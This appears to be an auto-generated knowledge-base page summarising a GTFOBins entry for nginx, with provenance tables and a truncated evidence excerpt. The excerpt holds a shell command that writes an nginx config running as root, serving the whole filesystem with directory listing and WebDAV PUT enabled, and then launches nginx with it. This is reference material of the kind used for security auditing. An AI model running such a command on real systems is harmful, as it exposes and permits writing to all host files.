---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# nginx

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `nginx` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/nginx` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for nginx covering download, library-load, upload.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/nginx.md)
- Source verification: [source record](../../sources/gtfobins/nginx.md)

## Aliases

- `nginx`

## Source Verification

[source record](../../sources/gtfobins/nginx.md)

## Evidence Excerpt

```text
_body: ''
_name: nginx
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/nginx
functions:
download:
- code: "cat >/path/to/temp-file <<EOF\nuser root;\nhttp {\n  server {\n    listen 80;\n    root /;\n    autoindex on;\n\
\    dav_methods PUT;\n  }\n}\nevents {}\nEOF\n\nnginx -c /path/to/temp-file"
contexts:
```
